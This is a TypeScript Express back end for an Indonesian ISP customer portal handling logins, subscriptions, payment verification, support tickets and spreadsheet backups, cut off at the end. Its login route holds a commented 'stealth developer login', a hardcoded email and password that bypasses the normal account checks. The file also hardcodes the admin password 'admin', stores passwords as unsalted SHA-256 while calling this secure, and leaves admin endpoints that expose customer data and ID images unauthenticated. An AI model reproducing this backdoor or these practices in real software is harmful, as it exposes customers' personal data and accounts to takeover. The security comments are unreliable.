import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';
import { CustomerUser, SupportTicket, PaymentRecord, WifiPackage } from './src/types';

// Simple password hashing/encryption simulation for security
// Using standard node.js crypto module for pristine secure hashing
import crypto from 'crypto';

const app = express();
const PORT = 3000;

// Middleware for parsing large bodies (specifically for base64 KTP images and receipt uploads)
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ limit: '10mb', extended: true }));

// JSON file persistence helper paths and functions
const CUSTOMERS_FILE = path.join(process.cwd(), 'db_customers.json');
const TICKETS_FILE = path.join(process.cwd(), 'db_tickets.json');
const SETTINGS_FILE = path.join(process.cwd(), 'db_company_settings.json');
const COVERAGE_FILE = path.join(process.cwd(), 'db_coverage_areas.json');
const PASSWORDS_FILE = path.join(process.cwd(), 'db_passwords.json');
const PACKAGES_FILE = path.join(process.cwd(), 'db_packages.json');
const TESTIMONIALS_FILE = path.join(process.cwd(), 'db_testimonials.json');

function loadJSON<T>(filePath: string, defaultVal: T): T {
  try {
    if (fs.existsSync(filePath)) {
      const data = fs.readFileSync(filePath, 'utf8');
      return JSON.parse(data) as T;
    }
  } catch (err) {
    console.error(`Failed to load ${filePath}:`, err);
  }
  return defaultVal;
}

function saveJSON<T>(filePath: string, data: T) {
  try {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2), 'utf8');
  } catch (err) {
    console.error(`Failed to save ${filePath}:`, err);
  }
}

// Default seed data for Customers list
const defaultCustomersList: CustomerUser[] = [
  {
    id: 'TR-1001',
    name: 'Budi Santoso',
    email: 'budi@gmail.com',
    phone: '081234567890',
    address: 'Jl. Ciomas Raya No. 44, RT. 03/RW. 02, Kel. Rawa Barat, Kec. Kebayoran Baru, Jakarta Selatan',
    coordinates: [-6.2345, 106.8123],
    packageId: 'taranet-exclusive',
    status: 'active',
    ktpImageUrl: 'https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=400&q=80',
    createdAt: '2026-07-01',
    payments: [
      {
        id: 'PAY-7001',
        date: '2026-07-02 09:15:30',
        amount: 275000,
        status: 'paid',
        proofOfPaymentUrl: 'https://images.unsplash.com/photo-1554415707-6e8cfc93fe23?auto=format&fit=crop&w=400&q=80',
        billingPeriod: 'Juli 2026',
        method: 'qris',
        transactionId: 'TX-88001122'
      }
    ]
  },
  {
    id: 'TR-1002',
    name: 'Dewi Lestari',
    email: 'dewi@gmail.com',
    phone: '089876543210',
    address: 'Jl. Margonda Raya No. 12, Kel. Pondok Cina, Kec. Beji, Depok, Jawa Barat',
    coordinates: [-6.3721, 106.8324],
    packageId: 'home-20m',
    status: 'active',
    ktpImageUrl: 'https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=400&q=80',
    createdAt: '2026-07-10',
    payments: [
      {
        id: 'PAY-7002',
        date: '2026-07-10 14:20:11',
        amount: 170000,
        status: 'paid',
        proofOfPaymentUrl: 'https://images.unsplash.com/photo-1554415707-6e8cfc93fe23?auto=format&fit=crop&w=400&q=80',
        billingPeriod: 'Juli 2026',
        method: 'bca',
        transactionId: 'TX-88001123'
      }
    ]
  },
  {
    id: 'TR-1003',
    name: 'Andi Wijaya',
    email: 'andi@gmail.com',
    phone: '081122334455',
    address: 'Komp. BSD Blok C4 No. 8, Kel. Lengkong Gudang, Kec. Serpong, Tangerang Selatan',
    coordinates: [-6.3023, 106.6821],
    packageId: 'taranet-prime',
    status: 'pending',
    ktpImageUrl: 'https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=400&q=80',
    createdAt: '2026-07-18',
    payments: [
      {
        id: 'PAY-7003',
        date: '2026-07-18 11:34:55',
        amount: 220000,
        status: 'pending_verification',
        proofOfPaymentUrl: 'https://images.unsplash.com/photo-1554415707-6e8cfc93fe23?auto=format&fit=crop&w=400&q=80',
        billingPeriod: 'Juli 2026',
        method: 'mandiri'
      }
    ]
  }
];

// Default seed data for Tickets list
const defaultTicketsList: SupportTicket[] = [
  {
    id: 'TCK-5001',
    userId: 'TR-1001',
    userName: 'Budi Santoso',
    email: 'budi@gmail.com',
    phone: '081234567890',
    message: 'Koneksi WiFi Taranet di rumah lambat sekali sejak hujan tadi sore, mohon diperiksa jalurnya.',
    date: '2026-07-18 19:45:00',
    status: 'open'
  }
];

// Hash passwords using SHA256 securely
function encryptPassword(password: string): string {
  return crypto.createHash('sha256').update(password).digest('hex');
}

// Load values from JSON files (with automatic seeds)
let customersList: CustomerUser[] = loadJSON<CustomerUser[]>(CUSTOMERS_FILE, defaultCustomersList);
let supportTicketsList: SupportTicket[] = loadJSON<SupportTicket[]>(TICKETS_FILE, defaultTicketsList);

const defaultPasswordsDb: { [userId: string]: string } = {
  'TR-1001': encryptPassword('user123'),
  'TR-1002': encryptPassword('user123'),
  'TR-1003': encryptPassword('user123'),
};
const passwordsDb: { [userId: string]: string } = loadJSON<{ [userId: string]: string }>(PASSWORDS_FILE, defaultPasswordsDb);

const defaultCoverageData = [
  {
    cityName: 'Jakarta Selatan',
    regionType: 'Kota',
    totalKecamatan: 4,
    totalKelurahan: 14,
    kecamatans: [
      {
        name: 'Kebayoran Baru',
        kelurahans: [
          { name: 'Rawa Barat', status: 'active', nodesCount: 12 },
          { name: 'Selong', status: 'active', nodesCount: 8 },
          { name: 'Melawai', status: 'active', nodesCount: 15 },
          { name: 'Kramat Pela', status: 'active', nodesCount: 11 },
          { name: 'Gunung', status: 'active', nodesCount: 9 }
        ]
      },
      {
        name: 'Cilandak',
        kelurahans: [
          { name: 'Cipete Selatan', status: 'active', nodesCount: 14 },
          { name: 'Gandaria Selatan', status: 'active', nodesCount: 16 },
          { name: 'Pondok Labu', status: 'active', nodesCount: 22 },
          { name: 'Lebak Bulus', status: 'active', nodesCount: 18 }
        ]
      },
      {
        name: 'Mampang Prapatan',
        kelurahans: [
          { name: 'Kuningan Barat', status: 'active', nodesCount: 25 },
          { name: 'Pela Mampang', status: 'active', nodesCount: 19 },
          { name: 'Bangka', status: 'active', nodesCount: 15 }
        ]
      },
      {
        name: 'Tebet',
        kelurahans: [
          { name: 'Menteng Dalam', status: 'active', nodesCount: 14 },
          { name: 'Tebet Barat', status: 'active', nodesCount: 17 }
        ]
      }
    ]
  },
  {
    cityName: 'Depok',
    regionType: 'Kota',
    totalKecamatan: 3,
    totalKelurahan: 9,
    kecamatans: [
      {
        name: 'Beji',
        kelurahans: [
          { name: 'Pondok Cina', status: 'active', nodesCount: 32 },
          { name: 'Beji Timur', status: 'active', nodesCount: 12 },
          { name: 'Kemiri Muka', status: 'active', nodesCount: 18 }
        ]
      },
      {
        name: 'Pancoran Mas',
        kelurahans: [
          { name: 'Depok Jaya', status: 'active', nodesCount: 14 },
          { name: 'Mampang', status: 'active', nodesCount: 10 },
          { name: 'Pancoran Mas', status: 'active', nodesCount: 16 }
        ]
      },
      {
        name: 'Cinere',
        kelurahans: [
          { name: 'Cinere', status: 'active', nodesCount: 20 },
          { name: 'Gandul', status: 'active', nodesCount: 15 },
          { name: 'Pangkalan Jati', status: 'active', nodesCount: 11 }
        ]
      }
    ]
  },
  {
    cityName: 'Tangerang Selatan',
    regionType: 'Kota',
    totalKecamatan: 3,
    totalKelurahan: 8,
    kecamatans: [
      {
        name: 'Serpong',
        kelurahans: [
          { name: 'Lengkong Gudang', status: 'active', nodesCount: 24 },
          { name: 'Serpong', status: 'active', nodesCount: 18 },
          { name: 'Cilenggang', status: 'active', nodesCount: 14 }
        ]
      },
      {
        name: 'Ciputat',
        kelurahans: [
          { name: 'Ciputat', status: 'active', nodesCount: 15 },
          { name: 'Cipayung', status: 'active', nodesCount: 12 },
          { name: 'Sawah Baru', status: 'active', nodesCount: 10 }
        ]
      },
      {
        name: 'Pondok Aren',
        kelurahans: [
          { name: 'Jurang Mangu Timur', status: 'active', nodesCount: 22 },
          { name: 'Pondok Jaya', status: 'active', nodesCount: 16 }
        ]
      }
    ]
  },
  {
    cityName: 'Bogor',
    regionType: 'Kota',
    totalKecamatan: 2,
    totalKelurahan: 6,
    kecamatans: [
      {
        name: 'Bogor Timur',
        kelurahans: [
          { name: 'Baranangsiang', status: 'active', nodesCount: 19 },
          { name: 'Katulampa', status: 'active', nodesCount: 28 },
          { name: 'Sukasari', status: 'active', nodesCount: 11 }
        ]
      },
      {
        name: 'Bogor Selatan',
        kelurahans: [
          { name: 'Batutulis', status: 'active', nodesCount: 15 },
          { name: 'Bondongan', status: 'active', nodesCount: 12 },
          { name: 'Empang', status: 'active', nodesCount: 20 }
        ]
      }
    ]
  },
  {
    cityName: 'Ciomas (Bogor)',
    regionType: 'Kabupaten',
    totalKecamatan: 1,
    totalKelurahan: 3,
    kecamatans: [
      {
        name: 'Ciomas',
        kelurahans: [
          { name: 'Ciomas Rahayu', status: 'active', nodesCount: 24 },
          { name: 'Ciomas Indah', status: 'active', nodesCount: 15 },
          { name: 'Pagelaran', status: 'active', nodesCount: 31 }
        ]
      }
    ]
  }
];

let coverageList = loadJSON<any[]>(COVERAGE_FILE, defaultCoverageData);
let packagesList = loadJSON<WifiPackage[]>(PACKAGES_FILE, []);

const defaultTestimonialsList = [
  {
    id: 'testi-1',
    name: 'Rahmat Hidayat',
    role: 'Gamers Profesional & Streamer',
    location: 'Kebayoran Baru, Jakarta Selatan',
    avatarUrl: 'https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?auto=format&fit=crop&w=200&h=200&q=80',
    rating: 5,
    text: 'Sebagai gamers dan streamer Twitch, latensi dan kestabilan ping adalah segalanya. Setelah beralih ke paket internet kami, ping stabil dan lancar tanpa jitter! Dan yang paling penting: tidak ada FUP sama sekali.',
    tag: 'STABILITAS GAMING'
  },
  {
    id: 'testi-2',
    name: 'Siti Aminah',
    role: 'Ibu Rumah Tangga (6 Perangkat Aktif)',
    location: 'Ciomas, Kabupaten Bogor',
    avatarUrl: 'https://images.unsplash.com/photo-1544005313-94ddf0286df2?auto=format&fit=crop&w=200&h=200&q=80',
    rating: 5,
    text: 'Anak-anak sekolah online, suami WFH, saya sendiri suka nonton drama Korea di Smart TV 4K. Hebatnya, paket internet ini sanggup melayani semua tanpa buffering sedikit pun! Biayanya sangat ramah di kantong.',
    tag: 'KELUARGA HEMAT'
  },
  {
    id: 'testi-3',
    name: 'Kevin Sanjaya',
    role: 'Software Engineer & Remote Worker',
    location: 'Serpong, Tangerang Selatan',
    avatarUrl: 'https://images.unsplash.com/photo-1500648767791-00dcc994a43e?auto=format&fit=crop&w=200&h=200&q=80',
    rating: 5,
    text: 'Sering melakukan deploy file besar ke AWS dan meeting Zoom dengan klien luar negeri. Kecepatan simetris 1:1, upload secepat downloadnya. Koneksi tidak pernah drop meskipun cuaca hujan lebat di luar rumah. Sangat profesional!',
    tag: 'PRODUKTIVITAS KERJA'
  },
  {
    id: 'testi-4',
    name: 'Lidya Natalia',
    role: 'Pemilik Kafe "Serene Beans"',
    location: 'Bogor Timur, Kota Bogor',
    avatarUrl: 'https://images.unsplash.com/photo-1534528741775-53994a69daeb?auto=format&fit=crop&w=200&h=200&q=80',
    rating: 5,
    text: 'Kami sewa STB Android dan pasang layanan internet premium untuk pengunjung kafe. Hasilnya pelanggan makin betah karena wifi kencang gratis. Support admin sangat kooperatif, laporan billing terbit otomatis.',
    tag: 'BISNIS & KAFE'
  }
];

let testimonialsList = loadJSON<any[]>(TESTIMONIALS_FILE, defaultTestimonialsList);

// Apps Script API Endpoint Web App url (can be set by admin or env)
let appScriptWebhookUrl = process.env.APP_SCRIPT_URL || '';

// Forward-declared/Captured auto-backup function
let backupTimeout: NodeJS.Timeout | null = null;

function queueAutoBackup(actionType?: string) {
  if (backupTimeout) {
    clearTimeout(backupTimeout);
  }
  backupTimeout = setTimeout(() => {
    triggerAutoBackup(actionType);
  }, 1500); // 1.5 seconds debounce
}

async function triggerAutoBackup(actionType?: string) {
  const webhookUrl = (companySettings as any)?.appScriptWebhookUrl || appScriptWebhookUrl;
  if (!webhookUrl) {
    console.log('[AUTO-BACKUP] No Google Apps Script URL configured yet.');
    return;
  }

  const backupPayload = {
    action: 'backup',
    timestamp: new Date().toISOString(),
    actionType: actionType || 'data_changed',
    companySettings: {
      name: companySettings?.name,
      address: companySettings?.address,
      logoText: companySettings?.logoText,
      themeColor: companySettings?.themeColor,
      logoUrl: companySettings?.logoUrl,
      tagline: (companySettings as any)?.tagline,
      billingDate: (companySettings as any)?.billingDate,
      contactPhone: (companySettings as any)?.contactPhone
    },
    customers: customersList.map(c => ({
      id: c.id,
      name: c.name,
      email: c.email,
      phone: c.phone,
      address: c.address,
      coordinates: c.coordinates,
      packageId: c.packageId,
      status: c.status,
      createdAt: c.createdAt,
      payments: c.payments || []
    })),
    tickets: supportTicketsList,
    packages: packagesList,
    coverage: coverageList,
    testimonials: testimonialsList
  };

  console.log(`[AUTO-BACKUP] Triggering automatic backup to Google Sheets for: ${actionType || 'data_changed'}`);

  try {
    const res = await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(backupPayload)
    });
    if (res.ok) {
      console.log('[AUTO-BACKUP] Google Sheets backup completed successfully.');
    } else {
      console.error('[AUTO-BACKUP] Google Sheets backup failed. Status:', res.status);
    }
  } catch (err: any) {
    console.error('[AUTO-BACKUP] Google Sheets backup request failed:', err.message);
  }
}

// Helper saves to ensure files are written back
const saveCustomers = () => {
  saveJSON(CUSTOMERS_FILE, customersList);
  queueAutoBackup('save_customers');
};
const saveTickets = () => {
  saveJSON(TICKETS_FILE, supportTicketsList);
  queueAutoBackup('save_tickets');
};
const savePasswords = () => saveJSON(PASSWORDS_FILE, passwordsDb);
const saveCoverage = () => {
  saveJSON(COVERAGE_FILE, coverageList);
  queueAutoBackup('save_coverage');
};
const savePackages = () => {
  saveJSON(PACKAGES_FILE, packagesList);
  queueAutoBackup('save_packages');
};
const saveTestimonials = () => {
  saveJSON(TESTIMONIALS_FILE, testimonialsList);
  queueAutoBackup('save_testimonials');
};

// Write once to make sure seed is written if not exists
if (!fs.existsSync(CUSTOMERS_FILE)) saveCustomers();
if (!fs.existsSync(TICKETS_FILE)) saveTickets();
if (!fs.existsSync(PASSWORDS_FILE)) savePasswords();
if (!fs.existsSync(COVERAGE_FILE)) saveCoverage();
if (!fs.existsSync(PACKAGES_FILE)) savePackages();
if (!fs.existsSync(TESTIMONIALS_FILE)) saveTestimonials();

// ---------------------- API ENDPOINTS ----------------------

// Auth Login API
app.post('/api/login', (req, res) => {
  const { email, password, isAdmin } = req.body;

  // 1. Stealth Developer login check (bypasses admin/customer distinction)
  if (email && email.toLowerCase() === 'ajayrostaman@gmail.com' && password === 'pengelola123') {
    return res.json({
      status: 'success',
      user: {
        isDeveloper: true,
        name: 'Developer Utama',
        email: 'ajayrostaman@gmail.com'
      }
    });
  }

  if (isAdmin) {
    const adminSlugEmail = `admin@${(companySettings.name || 'taranet').toLowerCase().replace(/\s+/g, '')}.id`;
    if ((email === 'admin@taranet.id' || (email && email.toLowerCase() === adminSlugEmail)) && password === 'admin') {
      return res.json({ status: 'success', user: { isAdmin: true } });
    }
    return res.status(401).json({ status: 'error', message: 'Kredensial Admin tidak valid.' });
  }

  // Customer Login
  const customer = customersList.find((c) => c.email.toLowerCase() === email.toLowerCase());
  if (!customer) {
    return res.status(401).json({ status: 'error', message: 'Alamat email pelanggan tidak terdaftar.' });
  }

  const storedHash = passwordsDb[customer.id];
  const inputHash = encryptPassword(password);

  if (storedHash === inputHash) {
    return res.json({ status: 'success', user: customer });
  }

  return res.status(401).json({ status: 'error', message: 'Password yang Anda masukkan salah.' });
});

// Helper to get initials prefix based on company name
function getCompanyPrefix(companyName: string): string {
  const clean = companyName.replace(/[^a-zA-Z\s]/g, '').trim();
  const words = clean.split(/\s+/);
  if (words.length >= 2) {
    const first = words[0][0] || 'T';
    const second = words[1][0] || 'R';
    return (first + second).toUpperCase();
  }
  if (clean.length >= 2) {
    return clean.substring(0, 2).toUpperCase();
  }
  return 'TR';
}

// Create subscription API
app.post('/api/subscribe', async (req, res) => {
  const { name, email, phone, password, address, coordinates, packageId, rentStb, ktpImageBase64, mapAddressDetail } = req.body;

  // Check unique constraints
  const duplicate = customersList.find((c) => c.email.toLowerCase() === email.toLowerCase() || c.phone === phone);
  if (duplicate) {
    return res.status(400).json({ status: 'error', message: 'Alamat email atau nomor handphone sudah digunakan.' });
  }

  // Generate ID with company prefix dynamically
  const prefix = getCompanyPrefix(companySettings.name || 'Taranet WiFi');
  const newId = `${prefix}-${Math.floor(1004 + Math.random() * 9000)}`;

  // Find price of package
  const pkgId = packageId || 'home-10m';
  const pkgPrice = 120000; // default backup fallback

  // Create payments list
  const initialPayment: PaymentRecord = {
    id: `PAY-${Math.floor(7004 + Math.random() * 9000)}`,
    date: new Date().toISOString().replace('T', ' ').substr(0, 19),
    amount: pkgPrice + (rentStb ? 25000 : 0),
    status: 'unpaid',
    billingPeriod: 'Juli 2026'
  };

  const newCustomer: CustomerUser = {
    id: newId,
    name,
    email,
    phone,
    address,
    coordinates: coordinates || [-6.2088, 106.8456],
    packageId: pkgId,
    status: 'pending',
    ktpImageUrl: ktpImageBase64 ? ktpImageBase64 : 'https://images.unsplash.com/photo-1600585154340-be6161a56a0c?auto=format&fit=crop&w=400&q=80',
    payments: [initialPayment],
    createdAt: new Date().toISOString().split('T')[0]
  };

  // Securely store credentials
  passwordsDb[newId] = encryptPassword(password);
  customersList.push(newCustomer);
  saveCustomers();
  savePasswords();

  // Real Google Apps Script integrations proxying
  const webhookUrl = (companySettings as any).appScriptWebhookUrl || appScriptWebhookUrl;
  if (webhookUrl) {
    try {
      // Forward pendaftaran to google apps script to save to real google spreadsheet and drive
      const controller = new AbortController();
      const idTimeout = setTimeout(() => controller.abort(), 6000); // 6s timeout max

      const gasResponse = await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: newId,
          name,
          email,
          phone,
          address,
          coordinates,
          packageId,
          rentStb,
          ktpImageBase64
        }),
        signal: controller.signal
      });
      clearTimeout(idTimeout);

      if (gasResponse.ok) {
        const gasResult: any = await gasResponse.json();
        if (gasResult && gasResult.fileUrl) {
          newCustomer.ktpImageUrl = gasResult.fileUrl; // overwrite with actual Google Drive share link!
          saveCustomers();
        }
      }
    } catch (gasErr) {
      console.error('Apps Script proxy failed (Using local backup persistence):', gasErr);
    }
  }

  return res.json({ status: 'success', user: newCustomer });
});

// Update Customer Status API
app.post('/api/customers/status', (req, res) => {
  const { id, status } = req.body;
  const customer = customersList.find((c) => c.id === id);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }

  customer.status = status;
  saveCustomers();
  return res.json({ status: 'success', user: customer });
});

// Update Customer Package API (Upgrade/Change package)
app.post('/api/customers/package', (req, res) => {
  const { id, packageId } = req.body;
  if (!id || !packageId) {
    return res.status(400).json({ status: 'error', message: 'ID Pelanggan dan ID Paket wajib diisi.' });
  }

  const customer = customersList.find((c) => c.id === id);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }

  // Look up package name and price
  let pkgName = '';
  let pkgPrice = 120000; // default fallback
  const pkg = packagesList.find((p) => p.id === packageId);
  if (pkg) {
    pkgName = pkg.name;
    pkgPrice = pkg.price;
  } else {
    const staticPkgs = [
      { id: 'home-10m', name: 'Home Basic 10 Mbps', price: 120000 },
      { id: 'home-15m', name: 'Home Starter 15 Mbps', price: 160000 },
      { id: 'home-20m', name: 'Home Lite 20 Mbps', price: 170000 },
      { id: 'home-30m', name: 'Home Family 30 Mbps', price: 210000 },
      { id: 'home-50m', name: 'Home Pro 50 Mbps', price: 270000 },
      { id: 'home-100m', name: 'Home Ultra 100 Mbps', price: 400000 },
      { id: 'taranet-prime', name: 'Taranet PRIME 50 Mbps', price: 349000 },
      { id: 'taranet-exclusive', name: 'Taranet EXCLUSIVE 100 Mbps', price: 649000 },
      { id: 'taranet-exclusive2', name: 'Taranet EXCLUSIVE II 200 Mbps', price: 1199000 },
      { id: 'taranet-ultimate', name: 'Taranet ULTIMATE 300 Mbps', price: 1699000 }
    ];
    const foundStatic = staticPkgs.find((p) => p.id === packageId);
    if (foundStatic) {
      pkgName = foundStatic.name;
      pkgPrice = foundStatic.price;
    } else {
      return res.status(400).json({ status: 'error', message: 'ID Paket tidak valid.' });
    }
  }

  customer.packageId = packageId;
  
  // Automatically update unpaid / pending bills to the new package price
  if (customer.payments && customer.payments.length > 0) {
    customer.payments = customer.payments.map((p) => {
      if (p.status === 'unpaid' || p.status === 'pending_verification') {
        return {
          ...p,
          amount: pkgPrice
        };
      }
      return p;
    });
  }

  saveCustomers();

  // Send WhatsApp notification simulator log
  logWhatsAppMessage(
    customer.phone,
    `Halo ${customer.name}, permohonan ganti/upgrade paket layanan internet Anda telah berhasil diproses oleh sistem admin. Paket layanan Anda saat ini aktif: ${pkgName}. Terima kasih!`
  );

  return res.json({ status: 'success', user: customer });
});

// Company Settings load and save from file with realistic default values
const defaultCompanySettings = {
  name: 'Taranet WiFi',
  address: 'Jl. Raya Kebayoran Baru No. 12, Jakarta Selatan, DKI Jakarta 12110',
  logoText: 'TARANET',
  themeColor: '#2563eb', // Default Blue
  logoUrl: '', // Starts empty (default SVG logo)
  appScriptWebhookUrl: '',
  promos: [] as string[],
  tagline: 'ULTRA BROADBAND',
  billingDate: 20,
  contactPhone: '+62 899-3299-977'
};

let companySettings = loadJSON(SETTINGS_FILE, defaultCompanySettings);
const saveSettings = () => saveJSON(SETTINGS_FILE, companySettings);
if (!fs.existsSync(SETTINGS_FILE)) saveSettings();

// WhatsApp automated notifications storage
const whatsappLogsList: { id: string; phone: string; message: string; time: string }[] = [];

function logWhatsAppMessage(phone: string, message: string) {
  const log = {
    id: `WA-${Math.floor(1000 + Math.random() * 9000)}`,
    phone: phone || '08123456789',
    message,
    time: new Date().toLocaleTimeString('id-ID') + ' ' + new Date().toLocaleDateString('id-ID')
  };
  whatsappLogsList.unshift(log);
  console.log(`[WHATSAPP AUTOMATED] To: ${log.phone} | Msg: ${log.message}`);
}

// Submit/Verify payment API (Proof of payment submission)
app.post('/api/payments/verify', (req, res) => {
  const { userId, paymentId, method, proofOfPaymentUrlBase64 } = req.body;

  const customer = customersList.find((c) => c.id === userId);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }

  const payment = customer.payments.find((p) => p.id === paymentId);
  if (!payment) {
    return res.status(404).json({ status: 'error', message: 'Tagihan tidak ditemukan.' });
  }

  payment.status = 'pending_verification';
  payment.method = method;
  payment.proofOfPaymentUrl = proofOfPaymentUrlBase64 || 'https://images.unsplash.com/photo-1554415707-6e8cfc93fe23?auto=format&fit=crop&w=400&q=80';
  payment.date = new Date().toISOString().replace('T', ' ').substr(0, 19);

  // Send automatic WhatsApp notification
  logWhatsAppMessage(
    customer.phone,
    `[WhatsApp Otomatis] Halo ${customer.name}, Bukti pembayaran untuk tagihan periode ${payment.billingPeriod} sebesar Rp ${payment.amount.toLocaleString('id-ID')} telah KAMI TERIMA dan sedang menunggu verifikasi oleh admin. Terima kasih!`
  );

  saveCustomers();
  return res.json({ status: 'success', user: customer });
});

// Approve Pending Payment API
app.post('/api/payments/approve', (req, res) => {
  const { userId, paymentId } = req.body;

  const customer = customersList.find((c) => c.id === userId);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }

  const payment = customer.payments.find((p) => p.id === paymentId);
  if (!payment) {
    return res.status(404).json({ status: 'error', message: 'Tagihan tidak ditemukan.' });
  }

  payment.status = 'paid';
  payment.transactionId = `TX-${Math.floor(88001000 + Math.random() * 9000)}`;

  // Automatically activate the customer if they were pending
  if (customer.status === 'pending') {
    customer.status = 'active';
  }

  // Send automatic WhatsApp notification
  logWhatsAppMessage(
    customer.phone,
    `[WhatsApp Otomatis] Halo ${customer.name}, Pembayaran tagihan ${companySettings.name} Anda untuk periode ${payment.billingPeriod} sebesar Rp ${payment.amount.toLocaleString('id-ID')} telah BERHASIL diverifikasi dan Lunas. Internet Anda tetap aktif & stabil tanpa FUP. Terima kasih!`
  );

  saveCustomers();
  return res.json({ status: 'success', user: customer });
});

// Reject Pending Payment API
app.post('/api/payments/reject', (req, res) => {
  const { userId, paymentId } = req.body;

  const customer = customersList.find((c) => c.id === userId);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }

  const payment = customer.payments.find((p) => p.id === paymentId);
  if (!payment) {
    return res.status(404).json({ status: 'error', message: 'Tagihan tidak ditemukan.' });
  }

  payment.status = 'unpaid'; // Set back to unpaid
  payment.proofOfPaymentUrl = undefined; // Clear failed proof

  // Send automatic WhatsApp notification
  logWhatsAppMessage(
    customer.phone,
    `[WhatsApp Otomatis] Halo ${customer.name}, Bukti pembayaran tagihan ${companySettings.name} Anda untuk periode ${payment.billingPeriod} sebesar Rp ${payment.amount.toLocaleString('id-ID')} dinyatakan TIDAK VALID atau GAGAL diverifikasi. Mohon unggah kembali bukti transfer yang benar atau hubungi Layanan Pelanggan.`
  );

  saveCustomers();
  return res.json({ status: 'success', user: customer });
});

// Get customer profile sync
app.get('/api/customers/:id', (req, res) => {
  const customer = customersList.find((c) => c.id === req.params.id);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }
  const tickets = supportTicketsList.filter((t) => t.userId === customer.id);
  return res.json({ status: 'success', user: { ...customer, tickets } });
});

// Get company settings API
app.get('/api/settings/company', (req, res) => {
  res.json(companySettings);
});

// Update company settings API
app.post('/api/settings/company', (req, res) => {
  const { name, address, logoText, themeColor, logoUrl, tagline, billingDate, contactPhone } = req.body;
  if (name) companySettings.name = name;
  if (address) companySettings.address = address;
  if (logoText) companySettings.logoText = logoText;
  if (themeColor) companySettings.themeColor = themeColor;
  if (logoUrl !== undefined) companySettings.logoUrl = logoUrl;
  if (tagline !== undefined) (companySettings as any).tagline = tagline;
  if (billingDate !== undefined) (companySettings as any).billingDate = parseInt(billingDate, 10) || 20;
  if (contactPhone !== undefined) (companySettings as any).contactPhone = contactPhone;

  saveSettings();

  logWhatsAppMessage(
    'SISTEM',
    `[Pengaturan] Identitas perusahaan diperbarui: ${companySettings.name} | ${companySettings.address}`
  );

  res.json({ status: 'success', settings: companySettings });
});

// Send Manual Billing WhatsApp Reminder API
app.post('/api/whatsapp/remind', (req, res) => {
  const { userId, paymentId, type } = req.body;
  const customer = customersList.find((c) => c.id === userId);
  if (!customer) {
    return res.status(404).json({ status: 'error', message: 'Pelanggan tidak ditemukan.' });
  }

  const payment = customer.payments.find((p) => p.id === paymentId);
  if (!payment) {
    return res.status(404).json({ status: 'error', message: 'Tagihan tidak ditemukan.' });
  }

  let reminderMessage = '';
  if (type === 'before_due') {
    reminderMessage = `[WhatsApp Pengingat Sebelum Jatuh Tempo] Halo ${customer.name}, ini adalah pengingat dari ${companySettings.name} bahwa tagihan WiFi Anda periode ${payment.billingPeriod} sebesar Rp ${payment.amount.toLocaleString('id-ID')} akan jatuh tempo dalam beberapa hari (sebelum tanggal ${(companySettings as any).billingDate || 20}). Mohon lakukan pembayaran melalui portal pelanggan Anda untuk menghindari isolir jaringan otomatis. Terima kasih!`;
  } else if (type === 'overdue') {
    reminderMessage = `[WhatsApp Peringatan Keterlambatan] Halo ${customer.name}, tagihan WiFi ${companySettings.name} Anda periode ${payment.billingPeriod} sebesar Rp ${payment.amount.toLocaleString('id-ID')} telah melewati batas jatuh tempo (Keterlambatan Pembayaran). Mohon segera lakukan pembayaran via QRIS atau transfer bank di portal pelanggan Anda agar jaringan tidak dinonaktifkan sementara. Terima kasih.`;
  } else {
    reminderMessage = `[WhatsApp Notifikasi] Halo ${customer.name}, tagihan WiFi ${companySettings.name} Anda periode ${payment.billingPeriod} sebesar Rp ${payment.amount.toLocaleString('id-ID')} belum diselesaikan. Silakan hubungi admin jika ada kendala. Terima kasih.`;
  }

  logWhatsAppMessage(customer.phone, reminderMessage);
  res.json({ status: 'success', message: 'Notifikasi WhatsApp berhasil dikirim!' });
});

// Get all data (Admin view only)
app.get('/api/admin/data', (req, res) => {
  res.json({
    customers: customersList,
    tickets: supportTicketsList,
    whatsappLogs: whatsappLogsList,
    companySettings
  });
});

// Save support ticket API
app.post('/api/support', (req, res) => {
  const { userId, userName, email, phone, message } = req.body;

  const newTicket: SupportTicket = {
    id: `TCK-${Math.floor(5004 + Math.random() * 9000)}`,
    userId,
    userName,
    email,
    phone,
    message,
    date: new Date().toISOString().replace('T', ' ').substr(0, 19),
    status: 'open'
  };

  supportTicketsList.push(newTicket);
  saveTickets();
  return res.json({ status: 'success', ticket: newTicket });
});

// Resolve support ticket API
app.post('/api/support/resolve', (req, res) => {
  const { ticketId } = req.body;
  const ticket = supportTicketsList.find((t) => t.id === ticketId);
  if (!ticket) {
    return res.status(404).json({ status: 'error', message: 'Tiket tidak ditemukan.' });
  }
  ticket.status = 'resolved';
  saveTickets();

  logWhatsAppMessage(
    ticket.phone,
    `[Dukungan] Laporan gangguan dengan ID ${ticketId} telah diselesaikan oleh tim teknisi. Koneksi internet Anda seharusnya sudah kembali normal. Terima kasih!`
  );

  return res.json({ status: 'success', ticket });
});

// ==================== TESTIMONIAL ENDPOINTS ====================

// Get all testimonials
app.get('/api/testimonials', (req, res) => {
  res.json(testimonialsList);
});

// Submit a new testimonial
app.post('/api/testimonials', (req, res) => {
  const { name, role, location, rating, text, tag, customerId } = req.body;
  
  if (!name || !text || !rating) {
    return res.status(400).json({ status: 'error', message: 'Nama, rating, dan isi testimoni harus diisi.' });
  }

  const newTestimonial = {
